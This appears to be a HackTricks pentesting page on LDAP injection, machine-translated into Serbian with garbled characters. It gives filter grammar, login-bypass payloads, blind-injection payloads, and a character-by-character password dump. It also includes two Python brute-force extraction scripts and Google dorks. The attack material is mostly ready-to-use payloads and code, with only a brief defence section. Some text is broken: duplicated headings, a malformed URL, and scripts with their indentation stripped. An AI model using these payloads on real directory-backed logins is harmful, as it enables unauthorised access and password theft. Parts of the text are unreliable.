# LDAP Injection

## LDAP Injection

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju oglaÅ¡enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty savet**: **registrujte se** za **Intigriti**, premium **platformu za bug bounty kreiranu od strane hakera, za hakere**! PridruÅ¾ite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## LDAP Injection

### **LDAP**

**Ako Å¾elite da saznate Å¡ta je LDAP, posetite sledeÄ‡u stranicu:**

{% content-ref url="../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

**LDAP Injection** je napad koji cilja veb aplikacije koje konstruiÅ¡u LDAP izjave na osnovu korisniÄkog unosa. Ovo se deÅ¡ava kada aplikacija **nepravilno sanitizuje** unos, omoguÄ‡avajuÄ‡i napadaÄima da **manipuliÅ¡u LDAP izjavama** putem lokalnog proksija, Å¡to moÅ¾e dovesti do neovlaÅ¡Ä‡enog pristupa ili manipulacije podacima.

{% file src="../.gitbook/assets/en-blackhat-europe-2008-ldap-injection-blind-ldap-injection.pdf" %}

**Filter** = ( filtercomp )\
**Filtercomp** = and / or / not / item\
**And** = & filterlist\
**Or** = |filterlist\
**Not** = ! filter\
**Filterlist** = 1\*filter\
**Item**= simple / present / substring\
**Simple** = attr filtertype assertionvalue\
**Filtertype** = _'=' / '\~=' / '>=' / '<='_\
**Present** = attr = \*\
**Substring** = attr â€=â€ \[initial] \* \[final]\
**Initial** = assertionvalue\
**Final** = assertionvalue\
**(&)** = Apolutna ISTINA\
**(|)** = Apolutna LAÅ½

Na primer:\
`(&(!(objectClass=Impresoras))(uid=s*))`\
`(&(objectClass=user)(uid=*))`

MoÅ¾ete pristupiti bazi podataka, koja moÅ¾e sadrÅ¾ati informacije razliÄitih tipova.

**OpenLDAP**: Ako stignu 2 filtera, izvrÅ¡ava se samo prvi.\
**ADAM ili Microsoft LDS**: Sa 2 filtera izbacuju greÅ¡ku.\
**SunOne Directory Server 5.0**: IzvrÅ¡ava oba filtera.

**Veoma je vaÅ¾no poslati filter sa ispravnom sintaksom ili Ä‡e biti izbaÄena greÅ¡ka. Bolje je poslati samo 1 filter.**

Filter mora poÄeti sa: `&` ili `|`\
Primer: `(&(directory=val1)(folder=public))`

`(&(objectClass=VALUE1)(type=Epson*))`\
`VALUE1 = *)(ObjectClass=*))(&(objectClass=void`

Zatim: `(&(objectClass=`**`*)(ObjectClass=*))`** Ä‡e biti prvi filter (onaj koji se izvrÅ¡ava).

### Bypassovanje prijave

LDAP podrÅ¾ava nekoliko formata za skladiÅ¡tenje lozinke: clear, md5, smd5, sh1, sha, crypt. Dakle, moguÄ‡e je da bez obzira na to Å¡ta unesete unutar lozinke, ona Ä‡e biti heÅ¡irana.
```bash
user=*
password=*
--> (&(user=*)(password=*))
# The asterisks are great in LDAPi
```

```bash
user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))
```

```bash
user=*)(|(&
pass=pwd)
--> (&(user=*)(|(&)(pass=pwd))
```

```bash
user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))
```

```bash
user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed
```

```bash
user=admin)(&)
password=pwd
--> (&(user=admin)(&))(password=pwd) #Can through an error
```

```bash
username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) â€”> As (|) is FALSE then the user is admin and the password check is True.
```

```bash
username=*
password=*)(&
--> (&(user=*)(password=*)(&))
```

```bash
username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))
```
#### Liste

* [LDAP\_FUZZ](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_FUZZ.txt)
* [LDAP atributi](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt)
* [LDAP PosixAccount atributi](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)

### Slepa LDAP ubacivanje

MoÅ¾ete prisiliti laÅ¾ne ili taÄne odgovore da proverite da li se vraÄ‡aju podaci i potvrdite moguÄ‡u slepu LDAP ubacivanje:
```bash
#This will result on True, so some information will be shown
Payload: *)(objectClass=*))(&objectClass=void
Final query: (&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))
```

```bash
#This will result on True, so no information will be returned or shown
Payload: void)(objectClass=void))(&objectClass=void
Final query: (&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
```
#### Dump podataka

MoÅ¾ete iterirati preko ASCII slova, brojeva i simbola:
```bash
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
```
### Skripte

#### **Otkrivanje validnih LDAP polja**

LDAP objekti **podrazumevano sadrÅ¾e nekoliko atributa** koji se mogu koristiti za **Äuvanje informacija**. MoÅ¾ete pokuÅ¡ati **brute-force metodom izvuÄ‡i te informacije** iz svih tih polja. MoÅ¾ete pronaÄ‡i listu [**podrazumevanih LDAP atributa ovde**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt).
```python
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = { "http": "localhost:8080" }
url = "http://10.10.10.10/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
value = ""
finish = False
while not finish:
for char in alphabet: #In each possition test each possible printable char
query = f"*)({attribute}={value}{char}*"
data = {'login':query, 'password':'bla'}
r = requests.post(url, data=data, proxies=proxy)
sys.stdout.write(f"\r{attribute}: {value}{char}")
#sleep(0.5) #Avoid brute-force bans
if "Cannot login" in r.text:
value += str(char)
break

if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
finish = True
print()
```
#### **Posebna slepa LDAP ubacivanje (bez "\*")**

------------------------------------------------------------------------------------------------------------------------------

##### **Opis**

LDAP (Lightweight Directory Access Protocol) je protokol koji se koristi za pristupanje i manipulaciju informacijama u direktorijumima. LDAP ubacivanje je tehnika napada koja omoguÄ‡ava napadaÄu da izvrÅ¡i zlonamerni kod ubacivanjem zlonamernih LDAP filtera u aplikaciju koja koristi LDAP za autentifikaciju ili pretragu korisnika.

UobiÄajena metoda LDAP ubacivanja koristi specijalne znakove poput "\*" kako bi se izvrÅ¡io napad. MeÄ‘utim, u nekim sluÄajevima, aplikacija moÅ¾e biti konfigurisana tako da ne dozvoljava koriÅ¡Ä‡enje ovih specijalnih znakova. U takvim situacijama, moÅ¾e se koristiti posebna slepa LDAP ubacivanje.

Posebna slepa LDAP ubacivanje se koristi kada aplikacija ne prikazuje rezultate LDAP pretrage direktno na korisniÄkom interfejsu. Umesto toga, aplikacija prikazuje samo odgovor "da" ili "ne" na osnovu rezultata pretrage. Ova tehnika se koristi za izvrÅ¡avanje slepog ubacivanja, gde napadaÄ moÅ¾e postaviti uslov koji Ä‡e biti ispunjen samo ako je ubacivanje uspeÅ¡no.

------------------------------------------------------------------------------------------------------------------------------

##### **Napadni vektor**

NapadaÄ moÅ¾e iskoristiti posebnu slepu LDAP ubacivanje tako Å¡to Ä‡e ubaciti zlonamerni LDAP filter u polje za pretragu ili autentifikaciju. Na primer, napadaÄ moÅ¾e pokuÅ¡ati da ubaci sledeÄ‡i filter:

```
(&(username=admin)(password=*)(sn=Smith))
```

Ako aplikacija ne prikazuje rezultate pretrage, ali prikazuje "da" ili "ne" na osnovu rezultata, napadaÄ moÅ¾e iskoristiti sledeÄ‡i filter kako bi proverio da li postoji korisnik sa prezimenom "Smith":

```
(&(username=admin)(password=*)(sn=Smith))
```

Ako aplikacija prikaÅ¾e "da", to znaÄi da postoji korisnik sa prezimenom "Smith". Ako prikaÅ¾e "ne", to znaÄi da takav korisnik ne postoji.

NapadaÄ moÅ¾e koristiti ovu tehniku za izvrÅ¡avanje razliÄitih vrsta napada, kao Å¡to su izvlaÄenje informacija o korisnicima, preuzimanje lozinki ili izvrÅ¡avanje komandi na serveru.

------------------------------------------------------------------------------------------------------------------------------

##### **ZaÅ¡tita**

Da bi se zaÅ¡titili od posebne slepe LDAP ubacivanja, preporuÄuje se sledeÄ‡e:

- Validacija i sanitizacija korisniÄkog unosa: Aplikacija treba da validira i sanitizuje korisniÄki unos kako bi se spreÄilo ubacivanje zlonamernih LDAP filtera.
- KoriÅ¡Ä‡enje parametrizovanih upita: Umesto da se koristi konkatenacija stringova za formiranje LDAP filtera, preporuÄuje se koriÅ¡Ä‡enje parametrizovanih upita kako bi se spreÄilo ubacivanje zlonamernog koda.
- OgraniÄavanje privilegija: Aplikacija treba da ima minimalne privilegije za pristup LDAP direktorijumu kako bi se smanjio rizik od zloupotrebe.

------------------------------------------------------------------------------------------------------------------------------

##### **Reference**

- [LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)
- [LDAP Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/ldap-injection-cheat-sheet/)
```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
print("[i] Looking for number " + str(i))
for char in alphabet:
r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
if ("TRUE CONDITION" in r.text):
flag += char
print("[+] Flag: " + flag)
break
```
### Google Dorks

### Google Dorks

Google Dorks su predefinisane pretrage koje se koriste za pronalaÅ¾enje ranjivosti na veb stranicama. Ove pretrage se koriste za pronalaÅ¾enje specifiÄnih informacija koje su javno dostupne na internetu. Google Dorks se mogu koristiti za pronalaÅ¾enje osetljivih podataka, kao Å¡to su lozinke, korisniÄka imena, baze podataka i druge informacije koje mogu biti iskoriÅ¡Ä‡ene za napad.

Evo nekoliko primera Google Dorks pretraga:

- `site:example.com intext:password` - Pretraga za stranice koje sadrÅ¾e reÄ "password" na sajtu example.com.
- `filetype:sql intext:username password` - Pretraga za SQL fajlove koji sadrÅ¾e reÄi "username" i "password".
- `inurl:admin.php` - Pretraga za stranice koje imaju "admin.php" u URL-u.
- `intitle:"index of" inurl:ftp` - Pretraga za FTP servere koji imaju "index of" u naslovu stranice.

Ove pretrage mogu biti veoma korisne za pronalaÅ¾enje ranjivosti na veb stranicama i otkrivanje osetljivih informacija. MeÄ‘utim, vaÅ¾no je napomenuti da je koriÅ¡Ä‡enje Google Dorks pretraga zakonito samo ako se koristi u okviru etiÄkog hakovanja ili pentestiranja.
```bash
intitle:"phpLDAPadmin" inurl:cmd.php
```
### Dodatni Payloadi

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty savet**: **registrujte se** na **Intigriti**, premium **platformu za bug bounty kreiranu od strane hakera, za hakere**! PridruÅ¾ite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini da podrÅ¾ite HackTricks:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
